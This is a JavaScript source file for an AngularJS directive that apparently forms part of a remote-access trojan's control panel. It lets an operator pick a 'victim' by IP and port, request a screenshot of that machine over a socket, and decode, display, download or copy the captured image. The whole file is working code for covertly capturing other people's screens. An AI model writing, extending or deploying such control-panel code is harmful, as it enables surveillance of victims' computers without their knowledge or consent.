angular.module('myappy').directive('labScreenshot', function($timeout, $sce) {
  return {
    restrict: 'E',
    scope: {
      victim: '='
    },
    templateUrl: '/views/screenshot.html',
    link: function(scope, element, attrs) {
      console.log('[Screenshot] Directive loaded');
      
      scope.screenshot = null;
      scope.screenshotUrl = null;
      scope.loading = false;
      scope.error = null;
      var socket = window.socket;
      var processingScreenshot = false;
      var screenshotBase64 = null;

      socket.off('screenshot-data');
      socket.on('screenshot-data', function(data) {
        console.log('[Screenshot] Data received');
        
        if (processingScreenshot) {
          console.log('[Screenshot] ⚠️ Already processing, ignoring');
          return;
        }
        
        if (data.error) {
          scope.$apply(function() {
            scope.error = data.error;
            scope.loading = false;
          });
          return;
        }
        
        if (!data.buffer) {
          return;
        }

        processingScreenshot = true;
        var b64 = data.buffer.trim();
        
        try {
          var cleanB64 = b64.replace(/[\s\n\r\t]/g, '');
          var finalB64 = cleanB64;
          var attempts = 0;
          var foundPNG = false;
          
          while (attempts < 3 && !foundPNG) {
            try {
              var decoded = atob(finalB64);
              
              if (decoded.startsWith('\x89PNG')) {
                console.log('[Screenshot] ✅ PNG found');
                foundPNG = true;
                break;
              }
              
              if (/^[A-Za-z0-9+/=]*$/.test(decoded) && decoded.length > 20) {
                console.log('[Screenshot] Decoding again...');
                finalB64 = decoded;
                attempts++;
              } else {
                console.log('[Screenshot] ⚠️ Not valid PNG');
                processingScreenshot = false;
                return;
              }
            } catch (e) {
              console.error('[Screenshot] Error:', e.message);
              if (attempts === 0) {
                processingScreenshot = false;
                return;
              }
              break;
            }
          }
          
          if (!foundPNG) {
            console.log('[Screenshot] ⚠️ No valid PNG found');
            processingScreenshot = false;
            return;
          }
          
          screenshotBase64 = finalB64;
          
          scope.$apply(function() {
            scope.screenshotUrl = 'data:image/png;base64,' + finalB64;
            scope.screenshot = true;
            scope.loading = false;
            console.log('[Screenshot] ✅ Image URL set, screenshot = true');
          });
          
          processingScreenshot = false;
          
        } catch (e) {
          console.error('[Screenshot] Error:', e.message);
          scope.$apply(function() {
            scope.error = 'Error: ' + e.message;
            scope.loading = false;
            processingScreenshot = false;
          });
        }
      });

      scope.takeScreenshot = function() {
        if (!scope.victim) {
          scope.error = 'No victim selected';
          return;
        }
        scope.loading = true;
        scope.error = null;
        processingScreenshot = false;
        var victimId = scope.victim.ip + ':' + scope.victim.port;
        socket.emit('get-screenshot', { victimId: victimId });
      };

      scope.downloadScreenshot = function() {
        if (!screenshotBase64) return;
        var link = document.createElement('a');
        link.href = 'data:image/png;base64,' + screenshotBase64;
        link.download = 'screenshot_' + Date.now() + '.png';
        link.click();
      };

      scope.copyToClipboard = function() {
        if (!screenshotBase64) return;
        fetch('data:image/png;base64,' + screenshotBase64)
          .then(res => res.blob())
          .then(blob => {
            navigator.clipboard.write([new ClipboardItem({ 'image/png': blob })])
              .then(() => alert('✅ Copied to clipboard'))
              .catch(err => console.error('Error:', err));
          });
      };

      scope.clearScreenshot = function() {
        scope.screenshot = null;
        scope.screenshotUrl = null;
        screenshotBase64 = null;
        processingScreenshot = false;
      };
    }
  };
});